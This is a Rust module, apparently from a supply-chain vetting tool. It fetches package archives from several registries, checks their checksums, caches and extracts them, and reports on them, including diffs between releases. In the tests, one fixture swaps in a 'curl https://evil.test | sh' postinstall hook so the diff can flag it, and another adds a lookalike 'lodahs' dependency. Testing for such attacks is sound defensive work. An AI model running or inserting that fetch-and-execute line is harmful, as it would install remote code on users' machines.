//! Resolve, download, verify, and extract one release archive.

use base64::Engine;
use sha2::{Digest, Sha256, Sha512};

use crate::archive::{ArchiveKind, Extracted, Limits, extract};
use crate::http::{HttpClient, HttpError};
use crate::model::{Ecosystem, PackageSpec};

#[derive(Debug, thiserror::Error)]
pub enum InspectError {
    #[error("archive is not available for {0}: {1}")]
    Unavailable(Ecosystem, String),
    #[error("archive download failed: {0}")]
    Http(String),
    #[error("archive could not be inspected: {0}")]
    Archive(String),
    #[error("archive URL refused: {0}")]
    Policy(String),
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Checksum {
    Sha1Hex(String),
    Sha256Hex(String),
    Sha512Base64(String),
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Integrity {
    Verified,
    Unverified,
    Mismatch { expected: String, actual: String },
}

#[derive(Debug)]
pub struct Prepared {
    pub url: String,
    pub kind: ArchiveKind,
    pub integrity: Integrity,
    pub extracted: Extracted,
    pub bytes: usize,
    /// Sigstore verification of the npm attestation, when one was published.
    pub provenance: Option<crate::provenance::ProvenanceReport>,
    /// Set when extraction stopped at the decompression cap. The archive was
    /// not scanned, so a report must say so.
    pub decompression_limit: Option<u64>,
    /// npm's `_npmUser` for this version. `None` when the registry does not
    /// record one or the ecosystem cannot provide it.
    pub publisher: Option<String>,
}

struct ArchiveRef {
    url: String,
    kind: ArchiveKind,
    checksum: Option<Checksum>,
    /// npm's attestation endpoint, when the version publishes one.
    provenance_url: Option<String>,
    publisher: Option<String>,
    composer_origin: Option<crate::netpolicy::ComposerOrigin>,
}

/// Downloaded archives are kept only when their checksum is known, so a cached
/// file can be re-verified before use. Unverified registries are never cached.
pub fn inspect_archive(
    http: &HttpClient,
    ecosystem: Ecosystem,
    spec: &PackageSpec,
    limits: Limits,
    use_cache: bool,
) -> Result<Prepared, InspectError> {
    let version = spec
        .version
        .as_deref()
        .ok_or_else(|| InspectError::Unavailable(ecosystem, "pass an exact version".to_string()))?;
    let source = resolve(http, ecosystem, &spec.name, version)?;
    let cached = source
        .checksum
        .as_ref()
        .filter(|_| use_cache)
        .and_then(load_cached)
        .filter(|bytes| {
            source
                .checksum
                .as_ref()
                .is_some_and(|checksum| verify(checksum, bytes) == Integrity::Verified)
        });
    let bytes = match cached {
        Some(bytes) => bytes,
        None => {
            let bytes = get_bytes(
                http,
                ecosystem,
                &source.url,
                limits.max_compressed,
                source.composer_origin.as_ref(),
            )?;
            if let Some(checksum) = &source.checksum
                && verify(checksum, &bytes) == Integrity::Verified
            {
                store_cached(checksum, &bytes);
            }
            bytes
        }
    };
    let integrity = match &source.checksum {
        Some(checksum) => verify(checksum, &bytes),
        None => Integrity::Unverified,
    };
    let (extracted, decompression_limit) = match extract(source.kind, &bytes, limits) {
        Ok(extracted) => (extracted, None),
        Err(crate::archive::ArchiveError::DecompressedTooLarge(limit)) => {
            (Extracted::default(), Some(limit))
        }
        Err(error) => return Err(InspectError::Archive(error.to_string())),
    };
    let provenance = if let Some(url) = source.provenance_url.as_deref() {
        crate::netpolicy::validate_url(Ecosystem::Npm, url).map_err(|error| {
            InspectError::Policy(format!("attestation URL rejected for {url}: {error}"))
        })?;
        Some(match http.get_trusted(Ecosystem::Npm, url) {
            Ok(body) => crate::provenance::verify(&body, &bytes),
            Err(crate::http::HttpError::Policy { message, .. }) => {
                return Err(InspectError::Policy(format!(
                    "attestation URL rejected for {url}: {message}"
                )));
            }
            Err(error) => {
                crate::provenance::unverified(format!("attestation could not be fetched: {error}"))
            }
        })
    } else {
        None
    };
    Ok(Prepared {
        url: source.url,
        kind: source.kind,
        integrity,
        extracted,
        bytes: bytes.len(),
        provenance,
        decompression_limit,
        publisher: source.publisher,
    })
}

/// Archive downloads retry transient failures the same way metadata requests
/// do, because a rate-limited tarball is not a missing package.
const DOWNLOAD_ATTEMPTS: u32 = 3;

fn get_bytes(
    http: &HttpClient,
    ecosystem: Ecosystem,
    url: &str,
    limit: u64,
    composer_origin: Option<&crate::netpolicy::ComposerOrigin>,
) -> Result<Vec<u8>, InspectError> {
    let mut last_error = None;
    for attempt in 0..DOWNLOAD_ATTEMPTS {
        match http.get_raw_with_origin(ecosystem, url, composer_origin) {
            Ok(mut response) => {
                let declared = response
                    .headers()
                    .get("content-length")
                    .and_then(|value| value.to_str().ok())
                    .and_then(|value| value.parse::<u64>().ok());
                if declared.is_some_and(|length| length > limit) {
                    return Err(InspectError::Archive(format!(
                        "archive is larger than {limit} bytes"
                    )));
                }
                match response
                    .body_mut()
                    .with_config()
                    .limit(limit + 1)
                    .read_to_vec()
                {
                    Ok(body) if body.len() as u64 <= limit => return Ok(body),
                    Ok(_) => {
                        return Err(InspectError::Archive(format!(
                            "archive is larger than {limit} bytes"
                        )));
                    }
                    Err(error) => {
                        // A truncated body is usually a network interruption.
                        last_error = Some(InspectError::Http(error.to_string()));
                    }
                }
            }
            Err(HttpError::Status { status: 404, .. }) => {
                return Err(InspectError::Unavailable(
                    ecosystem,
                    format!("{url} returned 404"),
                ));
            }
            Err(HttpError::Policy { message, .. }) => return Err(InspectError::Policy(message)),
            Err(error) if error.is_transient() && attempt + 1 < DOWNLOAD_ATTEMPTS => {
                std::thread::sleep(crate::http::retry_delay_jittered(
                    attempt,
                    error.retry_after(),
                ));
                last_error = Some(InspectError::Http(error.to_string()));
                continue;
            }
            Err(error) => return Err(InspectError::Http(error.to_string())),
        }
        if attempt + 1 < DOWNLOAD_ATTEMPTS {
            std::thread::sleep(crate::http::retry_delay_jittered(attempt, None));
        }
    }
    Err(last_error.unwrap_or_else(|| {
        InspectError::Http(format!("{url} failed after {DOWNLOAD_ATTEMPTS} attempts"))
    }))
}

/// Compare the registry-published digest with the bytes we received.
pub fn verify(checksum: &Checksum, bytes: &[u8]) -> Integrity {
    let (expected, actual) = match checksum {
        Checksum::Sha1Hex(expected) => (expected.clone(), hex(&sha1::Sha1::digest(bytes))),
        Checksum::Sha256Hex(expected) => (expected.clone(), hex(&Sha256::digest(bytes))),
        Checksum::Sha512Base64(expected) => {
            let actual = base64::engine::general_purpose::STANDARD.encode(Sha512::digest(bytes));
            (expected.clone(), actual)
        }
    };
    if expected.eq_ignore_ascii_case(&actual) {
        Integrity::Verified
    } else {
        Integrity::Mismatch { expected, actual }
    }
}

const ARCHIVE_RETENTION_SECONDS: u64 = 30 * 24 * 60 * 60;

fn checksum_key(checksum: &Checksum) -> String {
    let normalized = match checksum {
        Checksum::Sha1Hex(value) => format!("sha1:{value}"),
        Checksum::Sha256Hex(value) => format!("sha256:{value}"),
        Checksum::Sha512Base64(value) => format!("sha512:{value}"),
    };
    hex(&Sha256::digest(normalized.as_bytes()))
}

fn cache_file(checksum: &Checksum) -> Option<std::path::PathBuf> {
    crate::cache::cache_directory().map(|directory| {
        directory
            .join("archives")
            .join(format!("{}.bin", checksum_key(checksum)))
    })
}

fn load_cached(checksum: &Checksum) -> Option<Vec<u8>> {
    let path = cache_file(checksum)?;
    let metadata = std::fs::metadata(&path).ok()?;
    let modified = metadata.modified().ok()?;
    let age = std::time::SystemTime::now()
        .duration_since(modified)
        .unwrap_or_default()
        .as_secs();
    if age > ARCHIVE_RETENTION_SECONDS {
        let _ = std::fs::remove_file(&path);
        return None;
    }
    std::fs::read(&path).ok()
}

fn store_cached(checksum: &Checksum, bytes: &[u8]) {
    let Some(path) = cache_file(checksum) else {
        return;
    };
    if let Some(parent) = path.parent() {
        if std::fs::create_dir_all(parent).is_err() {
            return;
        }
        // Opportunistic sweep: drop archives nobody has touched for 30 days.
        if let Ok(entries) = std::fs::read_dir(parent) {
            let now = std::time::SystemTime::now();
            for entry in entries.flatten() {
                let old = entry
                    .metadata()
                    .ok()
                    .and_then(|metadata| metadata.modified().ok())
                    .and_then(|modified| now.duration_since(modified).ok())
                    .is_some_and(|age| age.as_secs() > ARCHIVE_RETENTION_SECONDS);
                if old {
                    let _ = std::fs::remove_file(entry.path());
                }
            }
        }
    }
    let temporary = path.with_extension("tmp");
    if std::fs::write(&temporary, bytes).is_ok() {
        let _ = std::fs::rename(&temporary, &path);
    }
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|byte| format!("{byte:02x}")).collect()
}

fn resolve(
    http: &HttpClient,
    ecosystem: Ecosystem,
    name: &str,
    version: &str,
) -> Result<ArchiveRef, InspectError> {
    match ecosystem {
        Ecosystem::Npm => resolve_npm(http, name, version),
        Ecosystem::Pypi => resolve_pypi(http, name, version),
        Ecosystem::CratesIo => resolve_crates(http, name, version),
        Ecosystem::Go => Ok(resolve_go(name, version)),
        Ecosystem::RubyGems => resolve_gem(http, name, version),
        Ecosystem::NuGet => Ok(resolve_nuget(name, version)),
        Ecosystem::Maven => resolve_maven(name, version),
        Ecosystem::Composer => resolve_composer(http, name, version),
        Ecosystem::Jsr => Err(InspectError::Unavailable(
            Ecosystem::Jsr,
            "the JSR archive URL is not documented yet".to_string(),
        )),
    }
}

fn get_json(http: &HttpClient, url: &str) -> Result<serde_json::Value, InspectError> {
    let body = http
        .get(url)
        .map_err(|error| InspectError::Http(error.to_string()))?;
    serde_json::from_str(&body).map_err(|error| InspectError::Archive(error.to_string()))
}

fn base(var: &str, default: &str) -> String {
    std::env::var(var).unwrap_or_else(|_| default.to_string())
}

fn resolve_npm(http: &HttpClient, name: &str, version: &str) -> Result<ArchiveRef, InspectError> {
    let base = base("DEPVET_REGISTRY_BASE", "https://registry.npmjs.org");
    let encoded = name.replace('/', "%2F");
    let doc = get_json(http, &format!("{base}/{encoded}/{version}"))?;
    let dist = &doc["dist"];
    let url = dist["tarball"]
        .as_str()
        .ok_or_else(|| InspectError::Unavailable(Ecosystem::Npm, "no tarball URL".to_string()))?;
    let checksum = dist["integrity"]
        .as_str()
        .and_then(|value| value.strip_prefix("sha512-"))
        .map(|value| Checksum::Sha512Base64(value.to_string()))
        .or_else(|| {
            dist["shasum"]
                .as_str()
                .map(|value| Checksum::Sha1Hex(value.to_string()))
        });
    Ok(ArchiveRef {
        url: url.to_string(),
        kind: ArchiveKind::TarGz,
        checksum,
        provenance_url: dist
            .get("attestations")
            .and_then(|attestations| attestations.get("url"))
            .and_then(|url| url.as_str())
            .filter(|url| url.starts_with("https://") || url.starts_with("http://"))
            .map(str::to_string),
        publisher: doc["_npmUser"]["name"].as_str().map(str::to_string),
        composer_origin: None,
    })
}

fn resolve_pypi(http: &HttpClient, name: &str, version: &str) -> Result<ArchiveRef, InspectError> {
    let base = base("DEPVET_PYPI_BASE", "https://pypi.org");
    let doc = get_json(http, &format!("{base}/pypi/{name}/{version}/json"))?;
    let files = doc["urls"]
        .as_array()
        .ok_or_else(|| InspectError::Unavailable(Ecosystem::Pypi, "no files".to_string()))?;
    let sdist = files
        .iter()
        .find(|file| file["packagetype"].as_str() == Some("sdist"))
        .or_else(|| files.first())
        .ok_or_else(|| InspectError::Unavailable(Ecosystem::Pypi, "no files".to_string()))?;
    let url = sdist["url"]
        .as_str()
        .ok_or_else(|| InspectError::Unavailable(Ecosystem::Pypi, "no URL".to_string()))?;
    let sha = sdist["digests"]["sha256"]
        .as_str()
        .map(|value| Checksum::Sha256Hex(value.to_string()));
    Ok(ArchiveRef {
        url: url.to_string(),
        kind: if url.ends_with(".zip") {
            ArchiveKind::Zip
        } else {
            ArchiveKind::TarGz
        },
        checksum: sha,
        provenance_url: None,
        publisher: None,
        composer_origin: None,
    })
}

fn resolve_crates(
    http: &HttpClient,
    name: &str,
    version: &str,
) -> Result<ArchiveRef, InspectError> {
    let base = base("DEPVET_CRATES_BASE", "https://crates.io");
    let doc = get_json(http, &format!("{base}/api/v1/crates/{name}/{version}"))?;
    let checksum = doc["version"]["checksum"]
        .as_str()
        .map(|value| Checksum::Sha256Hex(value.to_string()));
    Ok(ArchiveRef {
        url: format!("{base}/api/v1/crates/{name}/{version}/download"),
        kind: ArchiveKind::TarGz,
        checksum,
        provenance_url: None,
        publisher: None,
        composer_origin: None,
    })
}

/// Go module paths are case-encoded on the proxy: an uppercase letter becomes
/// `!` plus its lowercase form.
fn escape_go(module: &str) -> String {
    let mut escaped = String::with_capacity(module.len());
    for character in module.chars() {
        if character.is_ascii_uppercase() {
            escaped.push('!');
            escaped.push(character.to_ascii_lowercase());
        } else {
            escaped.push(character);
        }
    }
    escaped
}

fn resolve_go(name: &str, version: &str) -> ArchiveRef {
    let base = base("DEPVET_GOPROXY_BASE", "https://proxy.golang.org");
    ArchiveRef {
        url: format!("{base}/{}/@v/{version}.zip", escape_go(name)),
        kind: ArchiveKind::Zip,
        checksum: None,
        provenance_url: None,
        publisher: None,
        composer_origin: None,
    }
}

fn resolve_gem(http: &HttpClient, name: &str, version: &str) -> Result<ArchiveRef, InspectError> {
    let base = base("DEPVET_RUBYGEMS_BASE", "https://rubygems.org");
    let doc = get_json(http, &format!("{base}/api/v1/versions/{name}.json"))?;
    let checksum = doc
        .as_array()
        .and_then(|versions| {
            versions
                .iter()
                .find(|release| release["number"].as_str() == Some(version))
        })
        .and_then(|release| release["sha"].as_str())
        .map(|value| Checksum::Sha256Hex(value.to_string()));
    Ok(ArchiveRef {
        url: format!("{base}/gems/{name}-{version}.gem"),
        kind: ArchiveKind::Gem,
        checksum,
        provenance_url: None,
        publisher: None,
        composer_origin: None,
    })
}

fn resolve_nuget(name: &str, version: &str) -> ArchiveRef {
    let base = base("DEPVET_NUGET_BASE", "https://api.nuget.org");
    let id = name.to_ascii_lowercase();
    ArchiveRef {
        url: format!("{base}/v3-flatcontainer/{id}/{version}/{id}.{version}.nupkg"),
        kind: ArchiveKind::Zip,
        checksum: None,
        provenance_url: None,
        publisher: None,
        composer_origin: None,
    }
}

fn resolve_maven(name: &str, version: &str) -> Result<ArchiveRef, InspectError> {
    let (group, artifact) = name.split_once(':').ok_or_else(|| {
        InspectError::Unavailable(Ecosystem::Maven, "bad coordinates".to_string())
    })?;
    let google = ["androidx.", "com.android.", "com.google.android."]
        .iter()
        .any(|prefix| group.starts_with(prefix));
    let base = if google {
        base(
            "DEPVET_GOOGLE_MAVEN_BASE",
            "https://dl.google.com/dl/android/maven2",
        )
    } else {
        base("DEPVET_MAVEN_REPO_BASE", "https://repo1.maven.org/maven2")
    };
    Ok(ArchiveRef {
        url: format!(
            "{base}/{}/{artifact}/{version}/{artifact}-{version}-sources.jar",
            group.replace('.', "/")
        ),
        kind: ArchiveKind::Zip,
        checksum: None,
        provenance_url: None,
        publisher: None,
        composer_origin: None,
    })
}

fn resolve_composer(
    http: &HttpClient,
    name: &str,
    version: &str,
) -> Result<ArchiveRef, InspectError> {
    let base = base("DEPVET_COMPOSER_BASE", "https://repo.packagist.org");
    let doc = get_json(http, &format!("{base}/p2/{name}.json"))?;
    let entry = doc["packages"][name]
        .as_array()
        .and_then(|releases| {
            releases
                .iter()
                .find(|release| release["version"].as_str() == Some(version))
        })
        .ok_or_else(|| {
            InspectError::Unavailable(Ecosystem::Composer, "version not found".to_string())
        })?;
    let dist = &entry["dist"];
    let url = dist["url"]
        .as_str()
        .ok_or_else(|| InspectError::Unavailable(Ecosystem::Composer, "no dist URL".to_string()))?;
    let checksum = dist["shasum"]
        .as_str()
        .filter(|value| !value.is_empty())
        .map(|value| Checksum::Sha1Hex(value.to_string()));
    let composer_origin = Some(crate::netpolicy::ComposerOrigin::from_metadata(
        entry["source"]["url"].as_str(),
        Some(url),
    ));
    Ok(ArchiveRef {
        url: url.to_string(),
        kind: ArchiveKind::Zip,
        checksum,
        provenance_url: None,
        publisher: None,
        composer_origin,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn package_spec(version: &str) -> PackageSpec {
        PackageSpec {
            name: "pkg".to_string(),
            version: Some(version.to_string()),
        }
    }

    fn prepared(files: &[(&str, &str)], binaries: &[&str]) -> Prepared {
        Prepared {
            url: "https://example.test/archive".to_string(),
            kind: ArchiveKind::TarGz,
            integrity: Integrity::Verified,
            extracted: Extracted {
                files: files
                    .iter()
                    .map(|(path, text)| crate::archive::ExtractedFile {
                        path: path.to_string(),
                        text: text.to_string(),
                    })
                    .collect(),
                binaries: binaries.iter().map(|path| path.to_string()).collect(),
                ..Extracted::default()
            },
            bytes: 0,
            provenance: None,
            decompression_limit: None,
            publisher: None,
        }
    }

    fn diff(old: &Prepared, new: &Prepared) -> DiffReport {
        build_diff(
            Ecosystem::Npm,
            "pkg",
            &package_spec("1.0.0"),
            &package_spec("1.1.0"),
            old,
            new,
            &[],
            None,
            None,
        )
    }

    fn verified_by(identity: &str) -> crate::provenance::ProvenanceReport {
        crate::provenance::ProvenanceReport {
            status: "verified",
            identity: Some(identity.to_string()),
            issuer: Some("https://token.actions.githubusercontent.com".to_string()),
            reason: None,
            certificate: true,
            sct: true,
            tlog: true,
        }
    }

    fn advisory(id: &str, severity: crate::model::Severity) -> crate::osv::Advisory {
        crate::osv::Advisory {
            id: id.to_string(),
            summary: format!("summary for {id}"),
            severity,
            aliases: Vec::new(),
            url: format!("https://osv.dev/vulnerability/{id}"),
            fixed_versions: Vec::new(),
            details_missing: false,
        }
    }

    #[test]
    fn diff_reports_trust_and_declared_dependency_changes() {
        let mut old = prepared(&[("package.json", r#"{"dependencies":{"a":"1"}}"#)], &[]);
        old.publisher = Some("alice".to_string());
        old.provenance = Some(verified_by("https://github.com/alice/repo/release.yml"));
        let mut new = prepared(
            &[("package.json", r#"{"dependencies":{"a":"1","lodahs":"1"}}"#)],
            &[],
        );
        new.publisher = Some("mallory".to_string());

        let report = diff(&old, &new);
        let rule = |id: &str| {
            report
                .findings
                .iter()
                .find(|finding| finding.rule == id)
                .unwrap_or_else(|| panic!("missing {id}: {:?}", report.findings))
        };
        assert_eq!(
            rule("DIFF-PUBLISHER-001").severity,
            crate::model::Severity::Info
        );
        assert_eq!(
            rule("DIFF-PROVENANCE-001").severity,
            crate::model::Severity::Warn
        );
        let dependencies = rule("DIFF-DEPENDENCIES-001");
        assert_eq!(dependencies.severity, crate::model::Severity::Warn);
        assert!(dependencies.evidence.contains("lodahs"), "{dependencies:?}");
        assert!(
            dependencies.evidence.contains("lodash"),
            "a new lookalike is named: {dependencies:?}"
        );
        assert_eq!(report.verdict(), crate::model::Severity::Warn);
        assert_eq!(report.from_publisher.as_deref(), Some("alice"));
    }

    #[test]
    fn diff_reports_advisory_gains_and_resolutions() {
        let old_list = crate::osv::AdvisoryList {
            advisories: vec![advisory("GHSA-old", crate::model::Severity::Warn)],
            hidden: 0,
            stale_seconds: None,
        };
        let new_list = crate::osv::AdvisoryList {
            advisories: vec![
                advisory("GHSA-old", crate::model::Severity::Warn),
                advisory("GHSA-new", crate::model::Severity::High),
            ],
            hidden: 0,
            stale_seconds: None,
        };
        let old = prepared(&[("index.js", "const a = 1;")], &[]);
        let new = prepared(&[("index.js", "const a = 2;")], &[]);
        let report = build_diff(
            Ecosystem::Npm,
            "pkg",
            &package_spec("1.0.0"),
            &package_spec("1.1.0"),
            &old,
            &new,
            &[],
            Some(&old_list),
            Some(&new_list),
        );
        assert_eq!(report.new_advisories[0].id, "GHSA-new");
        assert!(report.resolved_advisories.is_empty());
        assert_eq!(report.verdict(), crate::model::Severity::High);
        assert_eq!(report.exit_code(), 2);
    }

    #[test]
    fn a_configured_trust_policy_is_not_claimed_for_non_npm() {
        let prepared = prepared(&[("index.js", "const a = 1;")], &[]);
        let mut report = build_report(Ecosystem::Jsr, &package_spec("1.0.0"), prepared, &[]);
        let policy = crate::provenance::TrustPolicy {
            require_attestation: true,
            ..crate::provenance::TrustPolicy::default()
        };
        apply_trust_policy(&mut report, &policy);
        assert!(report.findings.is_empty());
        assert!(
            report
                .not_checked
                .iter()
                .any(|item| item.contains("npm only")),
            "{:?}",
            report.not_checked
        );
    }

    #[test]
    fn a_decompression_bomb_is_a_high_finding_not_a_clean_report() {
        let mut prepared = prepared(&[("a.js", "const a = 1;")], &[]);
        prepared.extracted = crate::archive::Extracted::default();
        prepared.decompression_limit = Some(64 * 1024);
        let report = build_report(Ecosystem::Npm, &package_spec("1.0.0"), prepared, &[]);
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.rule == "archive-decompression-bomb")
            .expect("missing decompression finding");
        assert_eq!(finding.severity, crate::model::Severity::High);
        assert!(finding.evidence.contains("65536"));
        assert!(
            report
                .not_checked
                .iter()
                .any(|item| item.contains("decompression")),
            "{:?}",
            report.not_checked
        );
    }

    #[test]
    fn a_partial_scan_is_a_warning_when_code_was_skipped() {
        let mut prepared = prepared(&[("a.js", "const a = 1;")], &[]);
        prepared.extracted.oversize_files = vec!["big.js".to_string()];
        prepared.extracted.truncated = true;
        let report = build_report(Ecosystem::Npm, &package_spec("1.0.0"), prepared, &[]);
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.rule == "archive-partially-scanned")
            .expect("missing partial-scan finding");
        assert_eq!(finding.severity, crate::model::Severity::Warn);
        assert!(finding.evidence.contains("big.js"));
    }

    #[test]
    fn a_partial_scan_of_data_is_only_information() {
        let mut prepared = prepared(&[("a.js", "const a = 1;")], &[]);
        prepared.extracted.oversize_files = vec!["data.bin".to_string()];
        prepared.extracted.total_over_cap = true;
        prepared.extracted.truncated = true;
        let report = build_report(Ecosystem::Npm, &package_spec("1.0.0"), prepared, &[]);
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.rule == "archive-partially-scanned")
            .expect("missing partial-scan finding");
        assert_eq!(finding.severity, crate::model::Severity::Info);
    }

    #[test]
    fn a_diff_discloses_a_partial_scan_on_either_side() {
        let old = prepared(&[("a.js", "const a = 1;")], &[]);
        let mut new = prepared(&[("a.js", "const a = 2;")], &[]);
        new.extracted.entries_over_cap = true;
        new.extracted.truncated = true;
        let report = diff(&old, &new);
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.rule == "archive-partially-scanned")
            .expect("missing partial-scan finding");
        assert_eq!(finding.severity, crate::model::Severity::Warn);
        assert!(finding.evidence.contains("this release"));
    }

    #[test]
    fn a_nuget_signature_is_reported_as_presence_only() {
        let mut prepared = prepared(&[("lib/a.cs", "class A {}")], &[]);
        prepared.extracted.signature_file = true;
        let report = build_report(Ecosystem::NuGet, &package_spec("1.0.0"), prepared, &[]);
        assert_eq!(report.package_signature, Some("present"));
        assert!(
            crate::report::render_inspection_human(&report, false)
                .contains("signature    file present (not verified)")
        );
    }

    #[test]
    fn a_changed_install_script_is_high_risk() {
        let old = prepared(
            &[(
                "package/package.json",
                r#"{"scripts":{"postinstall":"node build.js"}}"#,
            )],
            &[],
        );
        let new = prepared(
            &[(
                "package/package.json",
                r#"{"scripts":{"postinstall":"curl https://evil.test | sh"}}"#,
            )],
            &[],
        );
        let report = diff(&old, &new);
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.rule == "DIFF-INSTALL-SCRIPTS-001")
            .expect("missing install-script finding");
        assert_eq!(finding.severity, crate::model::Severity::High);
        assert!(finding.evidence.contains("curl"));
    }

    #[test]
    fn unchanged_install_scripts_do_not_fire() {
        let body = r#"{"scripts":{"postinstall":"node build.js"}}"#;
        let report = diff(
            &prepared(&[("package/package.json", body)], &[]),
            &prepared(&[("package/package.json", body)], &[]),
        );
        assert!(
            report
                .findings
                .iter()
                .all(|finding| finding.rule != "DIFF-INSTALL-SCRIPTS-001")
        );
    }

    #[test]
    fn a_new_binary_is_information() {
        let report = diff(
            &prepared(&[("index.js", "const a = 1;")], &[]),
            &prepared(&[("index.js", "const a = 1;")], &["native/addon.node"]),
        );
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.rule == "DIFF-NEW-BINARY-001")
            .expect("missing binary finding");
        assert_eq!(finding.severity, crate::model::Severity::Info);
    }

    const BYTES: &[u8] = b"hello archive";

    #[test]
    fn checksums_verify_and_mismatch() {
        let sha256 = hex(&Sha256::digest(BYTES));
        assert_eq!(
            verify(&Checksum::Sha256Hex(sha256.clone()), BYTES),
            Integrity::Verified
        );
        assert!(matches!(
            verify(&Checksum::Sha256Hex("00".to_string()), BYTES),
            Integrity::Mismatch { .. }
        ));

        let sha512 = base64::engine::general_purpose::STANDARD.encode(Sha512::digest(BYTES));
        assert_eq!(
            verify(&Checksum::Sha512Base64(sha512), BYTES),
            Integrity::Verified
        );

        let sha1 = hex(&sha1::Sha1::digest(BYTES));
        assert_eq!(verify(&Checksum::Sha1Hex(sha1), BYTES), Integrity::Verified);
    }

    #[test]
    fn go_module_paths_are_case_escaped() {
        assert_eq!(
            escape_go("github.com/BurntSushi/toml"),
            "github.com/!burnt!sushi/toml"
        );
        assert_eq!(
            escape_go("github.com/gin-gonic/gin"),
            "github.com/gin-gonic/gin"
        );
    }
}

fn decompression_finding(limit: u64, side: &str) -> crate::rules::RuleFinding {
    crate::rules::RuleFinding {
        rule: "archive-decompression-bomb",
        title: "the archive expands past the decompression cap",
        description: "Decompressed data exceeded the configured limit, so the scan stopped.",
        severity: crate::model::Severity::High,
        confidence: crate::model::Confidence::High,
        file: String::new(),
        line: 0,
        evidence: format!(
            "{side}decompressed stream exceeds {limit} bytes; remaining content was not scanned"
        ),
        recommendation: "Treat this archive as hostile unless the size is expected; do not install it.",
        references: vec!["https://en.wikipedia.org/wiki/Zip_bomb"],
    }
}

/// A finished inspection, ready for rendering.
#[derive(Debug, serde::Serialize)]
pub struct InspectionReport {
    pub ecosystem: Ecosystem,
    pub name: String,
    pub version: String,
    pub archive_url: String,
    pub archive_kind: &'static str,
    pub bytes: usize,
    pub integrity: String,
    pub files_scanned: usize,
    pub files_skipped: usize,
    /// `present` when the archive carries a NuGet `.signature.p7s`. The
    /// signature is never verified, and absence is not reported.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub package_signature: Option<&'static str>,
    /// Cryptographic verification of the npm attestation, when published.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub provenance: Option<crate::provenance::ProvenanceReport>,
    pub findings: Vec<crate::rules::RuleFinding>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub not_checked: Vec<String>,
}

impl InspectionReport {
    pub fn verdict(&self) -> crate::model::Severity {
        self.findings
            .iter()
            .map(|finding| finding.severity)
            .max()
            .unwrap_or(crate::model::Severity::Info)
    }

    pub fn exit_code(&self) -> u8 {
        self.verdict().exit_code()
    }
}

pub fn build_report(
    ecosystem: Ecosystem,
    spec: &PackageSpec,
    prepared: Prepared,
    disabled_rules: &[String],
) -> InspectionReport {
    let mut findings = crate::rules::scan_with(&prepared.extracted.files, disabled_rules);
    let integrity = match &prepared.integrity {
        Integrity::Verified => "verified".to_string(),
        Integrity::Unverified => "unverified".to_string(),
        Integrity::Mismatch { expected, actual } => {
            findings.push(crate::rules::RuleFinding {
                rule: "ARCHIVE-CHECKSUM-001",
                title: "archive checksum does not match the registry",
                description: "The downloaded bytes differ from the release the registry published.",
                severity: crate::model::Severity::High,
                confidence: crate::model::Confidence::High,
                file: String::new(),
                line: 0,
                evidence: format!("expected {expected}, got {actual}"),
                recommendation: "Do not install; the download does not match the published release.",
                references: vec!["https://docs.npmjs.com/about-registry-signatures"],
            });
            format!("MISMATCH (expected {expected}, got {actual})")
        }
    };
    if let Some(finding) = crate::rules::partially_scanned(&prepared.extracted, "") {
        findings.push(finding);
    }
    if let Some(limit) = prepared.decompression_limit {
        findings.push(decompression_finding(limit, ""));
    }
    findings.sort_by(|left, right| {
        left.file
            .cmp(&right.file)
            .then(left.line.cmp(&right.line))
            .then(left.rule.cmp(right.rule))
    });

    let mut not_checked = Vec::new();
    if prepared.decompression_limit.is_some() {
        not_checked.push("source analysis (decompression cap reached)".to_string());
    } else if prepared.extracted.files.is_empty() {
        not_checked.push("source analysis (no text files in the archive)".to_string());
    }
    InspectionReport {
        ecosystem,
        name: spec.name.clone(),
        version: spec.version.clone().unwrap_or_default(),
        archive_url: prepared.url,
        archive_kind: match prepared.kind {
            ArchiveKind::TarGz => "tar.gz",
            ArchiveKind::Zip => "zip",
            ArchiveKind::Gem => "gem",
        },
        bytes: prepared.bytes,
        integrity,
        files_scanned: prepared.extracted.files.len(),
        files_skipped: prepared.extracted.skipped_binary + prepared.extracted.skipped_unsafe,
        package_signature: prepared.extracted.signature_file.then_some("present"),
        provenance: prepared.provenance,
        findings,
        not_checked,
    }
}

/// Apply the opt-in publisher policy on top of verification. A valid signature
/// is not a trusted publisher, and an absent one is never a clean result.
pub fn apply_trust_policy(report: &mut InspectionReport, policy: &crate::provenance::TrustPolicy) {
    if !policy.configured() {
        return;
    }
    // Offline verification exists for npm only. Saying "no attestation" for a
    // registry whose provenance we never looked for would be a false claim.
    if report.ecosystem != crate::model::Ecosystem::Npm {
        report
            .not_checked
            .push("publisher trust policy (npm only, not verified here)".to_string());
        return;
    }
    for issue in policy.check(report.provenance.as_ref()) {
        report.findings.push(crate::rules::RuleFinding {
            rule: issue.rule,
            title: issue.title,
            description: issue.description,
            severity: crate::model::Severity::Warn,
            confidence: issue.confidence,
            file: String::new(),
            line: 0,
            evidence: issue.detail,
            recommendation: issue.recommendation,
            references: crate::provenance::TRUST_REFERENCES.to_vec(),
        });
    }
    report.findings.sort_by(|left, right| {
        left.file
            .cmp(&right.file)
            .then(left.line.cmp(&right.line))
            .then(left.rule.cmp(right.rule))
    });
}

/// Security-focused comparison of two releases.
#[derive(Debug, serde::Serialize)]
pub struct DiffReport {
    pub ecosystem: Ecosystem,
    pub name: String,
    pub from_version: String,
    pub to_version: String,
    pub from_integrity: String,
    pub to_integrity: String,
    pub added: Vec<String>,
    pub removed: Vec<String>,
    pub modified: Vec<String>,
    pub unchanged: usize,
    /// Rule findings present in the new release but not the old one.
    pub findings: Vec<crate::rules::RuleFinding>,
    /// Findings that disappeared.
    pub resolved: Vec<crate::rules::RuleFinding>,
    /// npm's version publisher on each side, when the registry records one.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub from_publisher: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
